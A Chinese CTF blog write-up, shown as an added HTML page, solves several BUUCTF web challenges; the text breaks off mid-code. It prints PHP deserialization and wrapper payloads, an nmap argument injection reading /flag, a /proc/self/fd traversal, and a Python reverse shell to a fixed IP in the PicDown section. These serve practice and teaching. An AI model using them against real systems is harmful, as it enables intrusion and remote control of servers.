@@ -1,0 +1,1313 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title>BUUCTF(四) | T1h2er3的一亩三分地</title>
+  <meta name="description" content="这是一个菜鸡学习的地方" />
+  <meta name="keywords" content="CTF,WEB,林俊杰" />
+  
+    <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/2.jpg">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/googlefont.css" media="all">
+<!--  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">-->
+  <link rel="stylesheet" id="saukra_css-css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/font.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/insight.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "T1h2er3";
+  mashiro_option.author_name = "";
+  mashiro_option.site_url = "https://ther.wang";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/27.jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dot">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://ther.wang" target="_blank" rel="noopener">
+          <img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>像有永生一样梦想，像明天就会死去一样生活</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="http://github.com/t1h2er3" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="" target="_blank" class="social-github" title="email">
+                    <img src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/img/social/email.svg">
+                  </a>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  
+  <div id="video-container" style="display: none;">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu" >
+    </div>
+  </div>
+  
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+ 
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">T1h2er3</span>
+            <span class="shironeko"></span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    文章分类
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/comment/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+                    兴趣
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/music/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          音乐
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+
+      <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img">
+        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/34.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+      </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      BUUCTF(四)</h1>
+      <p class="entry-census">
+        <span>
+          <a href="https://ther.wang" target="_blank" rel="noopener">
+            <img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="https://ther.wang" target="_blank" rel="noopener">T1h2er3</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-5-28
+        
+      
+        ·<span id="readcount"></span>次阅读
+      
+      </p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="BUUCTF刷题4"><a href="#BUUCTF刷题4" class="headerlink" title="BUUCTF刷题4"></a>BUUCTF刷题4</h1><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>题目直接给出源码</p>
+<pre><code class="php">&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = &quot;1&quot;;
+        $filename = &quot;/tmp/tmpfile&quot;;
+        $content = &quot;Hello World!&quot;;
+        $this-&gt;process();
+    }
+
+    public function process() {
+        if($this-&gt;op == &quot;1&quot;) {
+            $this-&gt;write();
+        } else if($this-&gt;op == &quot;2&quot;) {
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        } else {
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        }
+    }
+
+    private function write() {
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+            if(strlen((string)$this-&gt;content) &gt; 100) {
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            }
+            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        } else {
+            $this-&gt;output(&quot;Failed!&quot;);
+        }
+    }
+
+    private function read() {
+        $res = &quot;&quot;;
+        if(isset($this-&gt;filename)) {
+            $res = file_get_contents($this-&gt;filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo &quot;[Result]: &lt;br&gt;&quot;;
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;
+        $this-&gt;process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{&#39;str&#39;})) {
+
+    $str = (string)$_GET[&#39;str&#39;];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}</code></pre>
+<p>基本思路就是构造op=2,file=flag.php去读文件</p>
+<p>有两个地方需要绕过一下</p>
+<p>第一,因为是protected属性，所以在序列化的时候会自动加送%00,但是在is_valid函数中会逐子判断ascii必须&gt;=32或&lt;=125</p>
+<p>__destruct()方法内使用了严格相等$this-&gt;op === “2”</p>
+<p>process()方法内使用了不严格相等else if ($this-&gt;op == “2”)<br>        所以这里使用弱类型2 == “2”绕过即可。</p>
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>打开网页，并没有发现什么东西，用burp抓个包看看情况</p>
+<p><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/2051801.png" alt="avatar"></p>
+<p>发现func和p的参数有点意思</p>
+<p>推测是func调用函数，p是参数</p>
+<p>尝试利用system(‘ls’)看看，结果发现被ban了</p>
+<p>经过测试众多函数，发现file_get_contents函数可以用</p>
+<p>所以用file_get_contents读一下index.php的源码</p>
+<pre><code class="php"> &lt;?php
+    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
+    function gettime($func, $p) {
+        $result = call_user_func($func, $p);
+        $a= gettype($result);
+        if ($a == &quot;string&quot;) {
+            return $result;
+        } else {return &quot;&quot;;}
+    }
+    class Test {
+        var $p = &quot;Y-m-d h:i:s a&quot;;
+        var $func = &quot;date&quot;;
+        function __destruct() {
+            if ($this-&gt;func != &quot;&quot;) {
+                echo gettime($this-&gt;func, $this-&gt;p);
+            }
+        }
+    }
+    $func = $_REQUEST[&quot;func&quot;];
+    $p = $_REQUEST[&quot;p&quot;];
+
+    if ($func != null) {
+        $func = strtolower($func);
+        if (!in_array($func,$disable_fun)) {
+            echo gettime($func, $p);
+        }else {
+            die(&quot;Hacker...&quot;);
+        }
+    }
+?&gt;</code></pre>
+<p>没有过滤unserialize函数，可以考虑反序列化</p>
+<pre><code class="php">&lt;?php
+ class Test {
+        var $p = &quot;ls -a&quot;;
+        var $func = &quot;system&quot;;
+
+}
+$a=new Test();
+echo serialize($a);</code></pre>
+<p>没有找打flag,利用 find / -name flag*查找flag</p>
+<p>找到/tmp/flagoefiu4r93</p>
+<p>cat /tmp/flagoefiu4r93拿到flag</p>
+<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>nmap命令</p>
+<p>127.0.0.1’ -iL /flag -oN ther.txt ‘</p>
+<h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>burp抓包，有任意文件包含漏洞，读取app.py源码</p>
+<pre><code class="python">from flask import Flask, Response
+from flask import render_template
+from flask import request
+import os
+import urllib
+
+app = Flask(__name__)
+
+SECRET_FILE = &quot;/tmp/secret.txt&quot;
+f = open(SECRET_FILE)
+SECRET_KEY = f.read().strip()
+os.remove(SECRET_FILE)
+
+
+@app.route(&#39;/&#39;)
+def index():
+    return render_template(&#39;search.html&#39;)
+
+
+@app.route(&#39;/page&#39;)
+def page():
+    url = request.args.get(&quot;url&quot;)
+    try:
+        if not url.lower().startswith(&quot;file&quot;):
+            res = urllib.urlopen(url)
+            value = res.read()
+            response = Response(value, mimetype=&#39;application/octet-stream&#39;)
+            response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39;
+            return response
+        else:
+            value = &quot;HACK ERROR!&quot;
+    except:
+        value = &quot;SOMETHING WRONG!&quot;
+    return render_template(&#39;search.html&#39;, res=value)
+
+
+@app.route(&#39;/no_one_know_the_manager&#39;)
+def manager():
+    key = request.args.get(&quot;key&quot;)
+    print(SECRET_KEY)
+    if key == SECRET_KEY:
+        shell = request.args.get(&quot;shell&quot;)
+        os.system(shell)
+        res = &quot;ok&quot;
+    else:
+        res = &quot;Wrong Key!&quot;
+
+    return res
+
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;, port=8080)</code></pre>
+<p>文件描述符，在linux里，当一个进程打开某个文件直到关闭前，该进程会获得文件描述符，而文件描述符里有文件的内容，即便已经将文件删除，只是删除了其相应的目录索引节点，若进程依然存在没被关闭的话，就依然可以通过文件提供给它的文件描述符进行操作。/proc/[pid]/fd 这个目录里包含了进程打开文件的情况pid就是进程记录的打开文件的序号</p>
+<p>虽然secret.txt被删了，但是做过一道原题，通过../../..//proc/self/fd/3找到secret.txt内容为cUzK2G4qXau9sjhaYPIlO2jp60LFH5qpBpIYaeV/GsI=</p>
+<p>在弹个shell就好了</p>
+<pre><code class="python">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.1.103.104&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
+<h2 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h2><p>关键代码</p>
+<pre><code class="php">$id=$_GET[&#39;id&#39;];
+    $gg=$_GET[&#39;gg&#39;];
+    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
+        echo &#39;You got the first step&#39;;
+        if(isset($_POST[&#39;passwd&#39;])) {
+            $passwd=$_POST[&#39;passwd&#39;];
+            if (!is_numeric($passwd))
+            {
+                 if($passwd==1234567)
+                 {
+                     echo &#39;Good Job!&#39;;
+                     highlight_file(&#39;flag.php&#39;);</code></pre>
+<p>md5强类型比较，可以用数组绕过（弱类型比较可以采用0e开头都为0的方式）</p>
+<p>is_numeric弱类型比较，可以构造 passwd=1234567.. 的方式绕过</p>
+<p>payload: GET : gg[]=1&amp;id[]=2</p>
+<p>​                POST: passwd=1234567..</p>
+<h2 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h2><p>源码中有一段js代码</p>
+<p><img src="https://s1.ax1x.com/2020/04/03/GNnBi6.png" alt="avatar"></p>
+<p>第一反应直接访问/flag.php</p>
+<p><img src="https://s1.ax1x.com/2020/04/03/GNu9lF.png" alt="avatar"></p>
+<p>想了一会,这上面说到了IP,尝试用 X-Forwarded-For:127.0.0.1 访问</p>
+<p>拿到flag</p>
+<h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>第一层：</p>
+<pre><code class="php">&lt;!--
+//1st
+$query = $_SERVER[&#39;QUERY_STRING&#39;];
+
+ if( substr_count($query, &#39;_&#39;) !== 0 || substr_count($query, &#39;%5f&#39;) != 0 ){
+    die(&#39;Y0u are So cutE!&#39;);
+}
+ if($_GET[&#39;b_u_p_t&#39;] !== &#39;23333&#39; &amp;&amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;b_u_p_t&#39;])){
+    echo &quot;you are going to the next ~&quot;;
+}
+!--&gt;</code></pre>
+<p>php会把 . 和空格转换成_，可以绕过第一个if判断</p>
+<p>preg_match正则匹配，可以在23333的后面加上%0A绕过正则</p>
+<p>然后发现了一则信息  <strong>FLAG is in secrettw.php</strong></p>
+<p>访问secrettw.php，发现一大段jsfuck的代码，放进控制台跑一下得到以下信息post me Merak</p>
+<p>post Merak=1之后得到网站源代码</p>
+<pre><code class="php">&lt;?php 
+error_reporting(0); 
+include &#39;takeip.php&#39;;
+ini_set(&#39;open_basedir&#39;,&#39;.&#39;); 
+include &#39;flag.php&#39;;
+
+if(isset($_POST[&#39;Merak&#39;])){ 
+    highlight_file(__FILE__); 
+    die(); 
+} 
+
+function change($v){ 
+    $v = base64_decode($v); 
+    $re = &#39;&#39;; 
+    for($i=0;$i&lt;strlen($v);$i++){ 
+        $re .= chr ( ord ($v[$i]) + $i*2 ); 
+    } 
+    return $re; 
+}
+echo &#39;Local access only!&#39;.&quot;&lt;br/&gt;&quot;;
+$ip = getIp();
+if($ip!=&#39;127.0.0.1&#39;)
+echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;
+if($ip === &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; ){
+echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);
+echo file_get_contents(change($_GET[&#39;file&#39;])); }
+?&gt;</code></pre>
+<p>1.第一层验证IP=127.0.0.1</p>
+<p>测试了以下常用绕过方法，发现Client-IP可以绕过，添加Header：Client-IP: 127.0.0.1</p>
+<p>2.file_get_contents()函数获取2333参数的内容，要求获取到的内容为todat is a happy day</p>
+<p>直接用data协议可以绕过：2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk= </p>
+<p>3.file的值经过change的值加密之后为flag.php</p>
+<p>写个脚本反推加密函数</p>
+<pre><code class="php">&lt;?php
+    $payload = &#39;flag.php&#39;;
+    $recover=&#39;&#39;;
+    for($i=0;$i&lt;strlen($payload);$i++){
+        $recover .= chr(ord($payload[$i])-2*$i);
+    }
+    echo $payload=base64_encode($recover);
+    //结果为ZmpdYSZmXGI=
+?&gt;</code></pre>
+<p>最后的<strong>payload=/secrettw.php?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=</strong></p>
+<p>成功拿到flag</p>
+<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>打开题目，给出了源码</p>
+<pre><code class="php">&lt;?php
+//flag is in flag.php
+//WTF IS THIS?
+//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+//And Crack It!
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this-&gt;append($this-&gt;var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file=&#39;index.php&#39;){
+        $this-&gt;source = $file;
+        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+    }
+    public function __toString(){
+        return $this-&gt;str-&gt;source;
+    }
+
+    public function __wakeup(){
+        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
+            echo &quot;hacker&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
+        }
+    }
+}
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this-&gt;p = array();
+    }
+
+    public function __get($key){
+        $function = $this-&gt;p;
+        return $function();
+    }
+}
+
+if(isset($_GET[&#39;pop&#39;])){
+    @unserialize($_GET[&#39;pop&#39;]);
+}
+else{
+    $a=new Show;
+    highlight_file(__FILE__);
+}</code></pre>
+<p>只有三个类，我们一个一个分析</p>
+<p>Modifier类</p>
+<pre><code class="php">class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this-&gt;append($this-&gt;var);
+    }
+}</code></pre>
+<p><strong>append</strong>方法内置<strong>include</strong>函数,自带$value。</p>
+<p><strong>_invoke</strong>魔术方法,是当脚本尝试将对象调用为函数时触发</p>
+<p>Show类</p>
+<pre><code class="php">class Show{
+    public $source;
+    public $str;
+    public function __construct($file=&#39;index.php&#39;){
+        $this-&gt;source = $file;
+        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+    }
+    public function __toString(){
+        return $this-&gt;str-&gt;source;
+    }
+
+    public function __wakeup(){
+        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
+            echo &quot;hacker&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
+        }
+    }
+}</code></pre>
+<p>__construct方法，接收参数$file，$this-&gt;source = $file将$file的值赋给source。而$file的值直接就是inde.php，所以还是输出index.php。</p>
+<p>__toString方法，当前对象访问str再访问source，然后返回这个值，就是把类当作字符串使用时触发</p>
+<p>wakeup方法，使用反序列化的时候触发，而这里同时也可以触发toString方法。里面有waf，过滤一些协议，但是显而易见可以用filter</p>
+<p>Test类</p>
+<pre><code class="php">class Test{
+    public $p;
+    public function __construct(){
+        $this-&gt;p = array();
+    }
+
+    public function __get($key){
+        $function = $this-&gt;p;
+        return $function();
+    }
+}</code></pre>
+<p>​     construct方法，把p对象变成一个数组。<br>​             get方法，从不可访问的属性中读取数据会触发</p>
+<p><strong>分析</strong></p>
+<p>1.题目根本是触发<strong>append</strong>方法，令$value=”php://filter/convert.base64-encode/resource=flag.php”</p>
+<p>2.要想触发<strong>append</strong>方法,就要触发<strong>invoke</strong>方法</p>
+<p>3.要想触发<strong>invoke</strong>方法,就得触发<strong>get</strong>方法</p>
+<p>4.<strong>toString</strong>方法访问str的source属性，而如果str没有source属性，就会触发get方法</p>
+<p>5.<strong>wakeup</strong>方法把对象当做字符串处理时，会自动调用<strong>toString</strong>方法</p>
+<p>6.反序列化函数会触发<strong>wakeup</strong>方法</p>
+<p><strong>payload</strong>构造</p>
+<pre><code class="php">&lt;?php
+class Modifier {
+    protected $var=&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;;
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file){
+        $this-&gt;source = $file;
+    }
+    public function __toString(){
+        return &#39;aaaa&#39;;
+    }
+}
+
+class Test{
+    public $p;
+}
+
+$a = new Show(&#39;aaa&#39;);
+$a-&gt;str = new Test();
+$a-&gt;str-&gt;p = new Modifier();
+$b = new Show($a);
+
+echo urlencode(serialize($b));</code></pre>
+<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>打开题目，是一个登录框，尝试注入未果，猜测有注册页面，于是访问了</p>
+<p>/register.php,注册了一个号，登录上去发现是更新自己的信息。</p>
+<p>没什么思路就尝试用dirsearch扫了一遍目录，发现有<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
+<p>开始审计</p>
+<pre><code class="php">&lt;?php
+    $config[&#39;hostname&#39;] = &#39;127.0.0.1&#39;;
+    $config[&#39;username&#39;] = &#39;root&#39;;
+    $config[&#39;password&#39;] = &#39;&#39;;
+    $config[&#39;database&#39;] = &#39;&#39;;
+    $flag = &#39;&#39;;
+?&gt;</code></pre>
+<p>config.php里有flag的值，那么这道题最后肯定是读取config.php里的内容</p>
+<p>来到profile.php</p>
+<pre><code class="php">&lt;?php
+    require_once(&#39;class.php&#39;);
+    if($_SESSION[&#39;username&#39;] == null) {
+        die(&#39;Login First&#39;);    
+    }
+    $username = $_SESSION[&#39;username&#39;];
+    $profile=$user-&gt;show_profile($username);
+    if($profile  == null) {
+        header(&#39;Location: update.php&#39;);
+    }
+    else {
+        $profile = unserialize($profile);
+        $phone = $profile[&#39;phone&#39;];
+        $email = $profile[&#39;email&#39;];
+        $nickname = $profile[&#39;nickname&#39;];
+        $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));
+?&gt;</code></pre>
+<p>很明显我们需要控制photo的值为config.php</p>
+<p>而$profile = unserialize($profile);考虑反序列化漏洞控制photo的值</p>
+<p>那么我们查看能对photo这个参数操作的地方</p>
+<p>在update.php里找到了对photo操作的地方</p>
+<pre><code class="php">&lt;?php
+    require_once(&#39;class.php&#39;);
+    if($_SESSION[&#39;username&#39;] == null) {
+        die(&#39;Login First&#39;);    
+    }
+    if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) {
+
+        $username = $_SESSION[&#39;username&#39;];
+        if(!preg_match(&#39;/^\d{11}$/&#39;, $_POST[&#39;phone&#39;]))
+            die(&#39;Invalid phone&#39;);
+
+        if(!preg_match(&#39;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&#39;, $_POST[&#39;email&#39;]))
+            die(&#39;Invalid email&#39;);
+
